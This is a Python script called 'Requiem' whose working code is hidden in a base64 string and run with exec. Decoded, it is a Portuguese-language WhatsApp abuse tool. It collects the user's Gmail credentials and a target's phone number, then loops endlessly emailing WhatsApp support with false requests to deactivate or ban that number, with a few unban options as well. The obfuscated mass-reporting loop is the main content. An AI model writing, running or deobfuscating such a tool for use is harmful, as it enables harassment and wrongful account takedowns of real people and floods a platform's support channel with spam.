import marshal, zlib, os, sys
# sla se base64 vem pr√©-instalada, lmfao
# Script Name: Requiem
# https://docs.python.org/3.5/library/smtplib.html 
# http://stackoverflow.com/a/27515833/2684304
# A simple Python program to demonstrate 
# getpass.getpass() to read security question
try:
	import base64
except:
	os.system("pip install base64")
	import base64
a = (base64.b64decode('''IyEvdXNyL2Jpbi9lbnYgcHl0aG9uCiMgLS0gY29kaW5nOiB1dGYtOCAtLQpnbG9iYWwgUixCLEMsWSxHLFJULENZLENPCkNPPSdcMDMzW20nO1I9J1wwMzNbMTszMW0nO0I9J1wwMzNbMTszNG0nO0M9J1wwMzNbMTszN20nO0NZPSdcMDMzWzE7MzZtJztZPSdcMDMzWzE7MzNtJztHPSdcMDMzWzE7MzJtJztSVD0nXDAzM1s7MG0nO05PX0ZPUk1BVD0iXDAzM1swbSI7Q19HUkVZODk9IlwwMzNbMzg7NTsyNTRtIjtDX1JFRDE9IlwwMzNbNDg7NTsxOTZtIgppbXBvcnQgc210cGxpYiwgb3MsIHN5cywgdGltZSwgc3NsLCBnZXRwYXNzCmRlZiBsaW5rKCk6Cglvcy5zeXN0ZW0oInRlcm11eC1vcGVuLXVybCBodHRwczovL215YWNjb3VudC5nb29nbGUuY29tL2xlc3NzZWN1cmVhcHBzP3BsaT0xJnJhcHQ9QUVqSEw0T1NnZ2pZT2d0OGc4SGJnU1U1OExwVXFRNUdzRDYzaXBFTnFhODRZZWdNSGlvbnFxdklYTU1vYzRicXUtQzBHSDBOLS1LYWxfQUZwZDVyUkpZeU8wZy15MUFiRVEiKQoKZGVmIHJlc3RhcnQoKToKICAgIHB5dGhvbiA9IHN5cy5leGVjdXRhYmxlO29zLmV4ZWNsKHB5dGhvbiwgcHl0aG9uLCAqc3lzLmFyZ3YpCgpkZWYgY2xlYXIoKToKCW9zLnN5c3RlbSgiY2xlYXIiKQoKY2xlYXIoKQp0cnk6CglpbXBvcnQgcHlmaWdsZXQKZXhjZXB0OgoJb3Muc3lzdGVtKCJwaXAgaW5zdGFsbCBweWZpZ2xldCIpO3Jlc3RhcnQoKQoKcmVzdWx0ID0gcHlmaWdsZXQuZmlnbGV0X2Zvcm1hdCgiUiBlIHEgdSBpIGUgbSIsIGZvbnQgPSAiY29zbWljIiApCnByaW50KGYnJyd7Q317R317cmVzdWx0fXtDfScnJykKcCA9IGlucHV0KGYne0N9W3tHfSF7Q31dIERpZ2l0ZSBhIFNlbmhhOiAnKQppZiBwID09ICc3YTNDYW1wb3MnOgogICAgcHJpbnQoZid7Q31be0d9KntDfV0gQWNlc3NvIExpYmVyYWRvJyk7cGFzcwplbHNlOgogICAgcHJpbnQoZid7Q31be1J9KntDfV0gU2VuaGEgSW5jb3JyZXRhJyk7dGltZS5zbGVlcCgyKTtyZXN0YXJ0KCkKCQoKYmxvY2tfbnVtID0gWyIrNTUgMjEgNzkxOC0wNTMzIiwiKzU1IDIxIDc5MTgwNTMzIiwiNTUgMjEgNzkxODA1MzMzMyIsIjU1IDIxIDc5MTgtMDUzMyIsIis1NTIxNzkxOC0wNTMzIiwiKzU1MjE3OTE4MDUzMyIsIjU1MjE3OTE4MDUzMyIsIjU1MjE3OTE4LTA1MzMiXQoKZGVmIGluaXQoKToKCXRyeToKCQl3aGlsZSBUcnVlOgoJCQlmb3IgbnVtIGluIGJsb2NrX251bToKCQkJCWlmIG51bSBpbiBudW1lcm86CgkJCQkJcHJpbnQoZidcbntDfVt7Un0he0N9XSBOw5pNRVJPIFBST0lCSURPLicpO3RpbWUuc2xlZXAoMyk7cmVzdGFydCgpCgkJCXBvcnQgPSA0NjUKCQkJc210cF9zZXJ2ZXIgPSAic210cC5nbWFpbC5jb20iCgkJCXNlbmRlcl9lbWFpbCA9ICJ7fSIuZm9ybWF0KGVtYWlsKQoJCQlyZWNlaXZlcl9lbWFpbCA9ICJzdXBwb3J0QHN1cHBvcnQud2hhdHNhcHAuY29tIgoJCQljb250ZXh0ID0gc3NsLmNyZWF0ZV9kZWZhdWx0X2NvbnRleHQoKQoJCQl3aXRoIHNtdHBsaWIuU01UUF9TU0woc210cF9zZXJ2ZXIsIHBvcnQsIAkJCWNvbnRleHQ9Y29udGV4dCkgYXMgc2VydmVyOgoJCQkgCXNlcnZlci5sb2dpbihzZW5kZXJfZW1haWwsIHBhc3N3b3JkKQoJCQkgCXNlcnZlci5zZW5kbWFpbChzZW5kZXJfZW1haWwsIHJlY2VpdmVyX2VtYWlsLCBtZXNzYWdlKQoJZXhjZXB0OgoJCXByaW50KGYie0N9W3tSfUVSUk9Se0N9XSBQZXJtaXNzYW8gbmFvIGdhcmFudGlkYSBvdSBzZW5oYSBlIGVtYWlsIGludmFsaWRvKHMpLiIpO3RpbWUuc2xlZXAoNSk7cGFzcwoKU2FpciA9IFRydWUKd2hpbGUoU2FpciA9PSBUcnVlKToKCWNsZWFyKCk7cHJpbnQoZicnJ3tDfXtHfQp7cmVzdWx0fQouLi5gCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLitzcysvL29zczpgCiAgICAgICAgICAgICAgICAgICAgICAgICBgOm95Ky0gICAgICAgYDpzcysuCiAgICAgICAgICAgICAgICAgICAgICBgL3NzL2AgICAgICAgICAgICAgIC1veW8tCiAgICAgICAgICAgICAgICAgICAtK3lvOiAgICAgICAgICAgICAgICAgICAgIGAveXMvYAogICAgICAgICAgICAgICBgOnN5Ky4gICAgICAgICAgICAgICAgICAgICAgICAgICBgOnN5Ky4KICAgICAgICAgICAgYC9zcy9gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC0reW8rCiAgICAgICAgICAgLWgvICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAueXNgCiAgICAgICAgICBgbS0gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLStzc2RvCiAgICAgICAgICAtZCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgOnNkTk5OTk5kCiAgICAgICAgICA6ZCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBgL3ltTk5OTk5OTk5kCiAgICAgICAgICA6ZCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAuK2hOTk5OTk5OTk5OTk5kCiAgICAgICAgICA6ZCAgICAgICAgICAgICAgICAgICAgICAgICAgICAtb2ROTk5OTk5OTk5OTk5OTk5kCiAgICAgICAgICA6ZCAgICAgICAgICAgICAgICAgICAgICAgICA6c2ROTk5OTk5OTk5OTk5OTk5OTk5kCiAgICAgICAgICA6ZCAgICAgICAgICAgICAgICAgICAgICAgK21OTk5OTk5OTk5OTk5OTk5OTk5OTk5kCiAgICAgICAgICA6ZCAgICAgICAgICAgICAgICAgICAgICBzTk5OTk5OTk5OTk5OTk5OTk5OTk5OTk5kCiAgICAgICAgICA6ZCAgICAgICAgICAgICAgICAgICAgICBoTk5OTk55YHl5Tk5OTk5OTk5OTk5OTk5kCiAgICAgICAgICA6ZCAgICAgICAgICAgICAgICAgICAgICBoTk5OTmgtLjpzTk5OTk5OTk5OTk5OTk5kCiAgICAgICAgICA6ZCAgICAgICAgICAgICAgICAgICAgICBoTk5OaGArTk5OTk5OTk5OTk5OTk5OTk5kCiAgICAgICAgICAtZCAgICAgICAgICAgICAgICAgICAgICBoTk5OeSAgYC4vbU5OTk5OTk5OTk5OTk5kCiAgICAgICAgICBgbS4gICAgICAgICAgICAgICAgICAgICBoTk5OTmR5eS0gZE5OTk5OaG1OTk5OTk5zCiAgICAgICAgICAgOmQ6ICAgICAgICAgICAgICAgICAgICBoTk5OTk5taC4vTk5teS8tK21OTk5OTnlgCiAgICAgICAgICAgIGAreXM6YCAgICAgICAgICAgICAgICBoTk5OaGBgIHlOTk5vb2ROTk5OTm15OgogICAgICAgICAgICAgICBgL3l5Ly4gICAgICAgICAgICAgaE5OTk5taC9tTk5OTk5OTk5kby0KICAgICAgICAgICAgICAgICAgYDpzeW8tICAgICAgICAgIGhOTk5OTk5OTk5OTk5OaCsuCiAgICAgICAgICAgICAgICAgICAgICAuK3lzOmAgICAgICBoTk5OTk5OTk5ObXMvYAogICAgICAgICAgICAgICAgICAgICAgICAgYC9zeSsuICAgeU5OTk5OTmRvLQogICAgICAgICAgICAgICAgICAgICAgICAgICAgIC1veW8vK21ObXkvLgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGAtOjo6CntDfVxue0N9e0d9Q29kZWQgQnk6e0N9IEtpbnlcbntDfVt7Un0qe0N9XSBBdGl2ZSBhIHBlcm1pc3PDo28gZGUgYmFpeGEgc2VndXJhbsOnYSBlIHV0aWxpemUgdW0gZW1haWwgcG9yIGF0YXF1ZShyZWNvbWVuZGHDp8OjbykuJycnKTtsaW5rKCk7b3AgPSBpbnB1dChmIlxue0N9e1l9TydxdWUgZGVzZWphIGZhemVyP3tDfVxue0N9W3tHfTF7Q31dIERlc2F0aXZhciBOdW1lcm9cbntDfVt7R30ye0N9XSBSZXRpcmFyIGRvIENvbnRhZG9yXG57Q31be0d9M3tDfV0gUmV0aXJhciBCYW5pbWVudG9cbntDfVt7R300e0N9XSBCYW5pciBOdW1lcm97Q31cbntDfVt7Un0we0N9XSBTYWlyXG57Q31be0d9RGlnaXRlIGEgb3DDp8Ojb3tDfV06ICIpCglpZiBvcCA9PSAnMSc6CgkJZW1haWwgPSBpbnB1dChmJ3tDfVt7WX1HbWFpbHtDfV06ICcpO3Bhc3N3b3JkID0gaW5wdXQoZid7Q31be1l9U2VuaGEgKE7Do28gc2UgcHJlb2N1cGUsIG7Do28gdGVtb3MgYWNlc3NvIMOgIHN1YSBzZW5oYSl7Q31dOiAnKTtudW1lcm8gPSBpbnB1dChmJ3tDfVt7WX1OdW1lcm8gZG8gQWx2byAoZXg6IDU1IDIxIDkqKioqKXtDfV06ICcpCgkJbWVzc2FnZSA9ICIiIlwKU3ViamVjdDogRGVzYXRpdmUgZXN0ZSBudW1lcm8KCkRlc2F0aXZlIGVzdGEgY29udGEgdXJnZW50ZW1lbnRlOiB7fSIiIi5mb3JtYXQobnVtZXJvKQoJCXByaW50KGYne0N9e1J9RGVzYXRpdmFuZG8gTsO6bWVybyF7Q31cblVzZSB7Q317Un1DVFJMIEN7Q30gcGFyYSBwYXJhciBvIHNjcmlwdCBlIHtDfXtHfXB5dGhvbjMgbWFpbi5weXtDfSBwYXJhIHJlaW5pY2lhci4nKTtpbml0KCkKCgllbGlmIG9wID09ICcyJzoKCQllbWFpbCA9IGlucHV0KGYne0N9W3tZfUdtYWlse0N9XTogJyk7cGFzc3dvcmQgPSBpbnB1dChmJ3tDfVt7WX1TZW5oYSAoTsOjbyBzZSBwcmVvY3VwZSwgbsOjbyB0ZW1vcyBhY2Vzc28gw6Agc3VhIHNlbmhhKXtDfV06ICcpO251bWVybyA9IGlucHV0KGYne0N9W3tZfU51bWVybyBkbyBBbHZvIChleDogNTUgMjEgOSoqKiope0N9XTogJykKCQltZXNzYWdlID0gIiIiXApTdWJqZWN0OiBSZWVudmlhciBjb2RpZ28gZGUgdmVyaWZpY2FjYW8KCk9sYSwgbmFvIGNvbnNpZ28gbWUgcmVnaXN0cmFyIG5hIG1pbmhhIGNvbnRhLCBtZSBhanVkZW06IHt9IiIiLmZvcm1hdChudW1lcm8pCgkJcHJpbnQoZid7Q317R31UaXJhbmRvIGRvIENvbnRhZG9yIXtDfVxuVXNlIHtDfXtSfUNUUkwgQ3tDfSBwYXJhIHBhcmFyIG8gc2NyaXB0IGUge0N9e0d9cHl0aG9uMyBtYWluLnB5e0N9IHBhcmEgcmVpbmljaWFyLicpO2luaXQoKQoKCWVsaWYgb3AgPT0gJzMnOgoJCWVtYWlsID0gaW5wdXQoZid7Q31be1l9R21haWx7Q31dOiAnKTtwYXNzd29yZCA9IGlucHV0KGYne0N9W3tZfVNlbmhhIChOw6NvIHNlIHByZW9jdXBlLCBuw6NvIHRlbW9zIGFjZXNzbyDDoCBzdWEgc2VuaGEpe0N9XTogJyk7bnVtZXJvID0gaW5wdXQoZid7Q31be1l9TnVtZXJvIGRvIEFsdm8gKGV4OiA1NSAyMSA5KioqKil7Q31dOiAnKQoJCW1lc3NhZ2UgPSAiIiJcClN1YmplY3Q6IE51bWVybyBiYW5pZG8KCk1ldSBudW1lcm8gZm9pIGJhbmlkbyBpbmRldmlkYW1lbnRlLCBpc3RvIGZvaSB1bSBlbmdhbm8uIEZ1aSBlbmdhbmFkbyBlIHJvdWJhcmFtIG1ldSBudW1lcm8sIHByZWNpc28gYXRpdmFyIG1pbmhhIGNvbnRhLCBwb2lzIHRlbmhvIHVtYSBlbXByZXNhIGUgdGVuaG8gcGVkaWRvcyBwZW5kZW50ZXM6IHt9IiIiLmZvcm1hdChudW1lcm8pCgkJcHJpbnQoZid7Q317R31SZXRpcmFuZG8gQmFuaW1lbnRvIXtDfVxuVXNlIHtDfXtSfUNUUkwgQ3tDfSBwYXJhIHBhcmFyIG8gc2NyaXB0IGUge0N9e0d9cHl0aG9uMyBtYWluLnB5e0N9IHBhcmEgcmVpbmljaWFyLicpO2luaXQoKQoKCWVsaWYgb3AgPT0gJzQnOgoJCWVtYWlsID0gaW5wdXQoZid7Q31be1l9R21haWx7Q31dOiAnKTtwYXNzd29yZCA9IGlucHV0KGYne0N9W3tZfVNlbmhhIChOw6NvIHNlIHByZW9jdXBlLCBuw6NvIHRlbW9zIGFjZXNzbyDDoCBzdWEgc2VuaGEpe0N9XTogJyk7bnVtZXJvID0gaW5wdXQoZid7Q31be1l9TnVtZXJvIGRvIEFsdm8gKGV4OiA1NSAyMSA5KioqKil7Q31dOiAnKQoJCW1lc3NhZ2UgPSAiIiJcClN1YmplY3Q6IEZhY2FtIG8gYmFuaW1lbnRvIGRvIG1ldSBudW1lcm8KCkZhdm9yIGJhbmlyIG1ldSBudW1lcm86IHt9IiIiLmZvcm1hdChudW1lcm8pCgkJcHJpbnQoZid7Q317Un1CYW5pbmRvIXtDfVxuVXNlIHtDfXtSfUNUUkwgQ3tDfSBwYXJhIHBhcmFyIG8gc2NyaXB0IGUge0N9e0d9cHl0aG9uMyBtYWluLnB5e0N9IHBhcmEgcmVpbmljaWFyLicpO2luaXQoKQoKCWVsaWYgb3AgPT0gJzAnOgoJCVNhaXIgPSBGYWxzZQpvcy5zeXN0ZW0oJ3JtIC1yZiBfX3B5Y2FjaGVfXycpCnByaW50KGYnW3tDfXtSfSt7Q31dIFt7Q317Un1BcnJpdmVkZXJjaXtDfV0nKQ=='''))
exec(a)
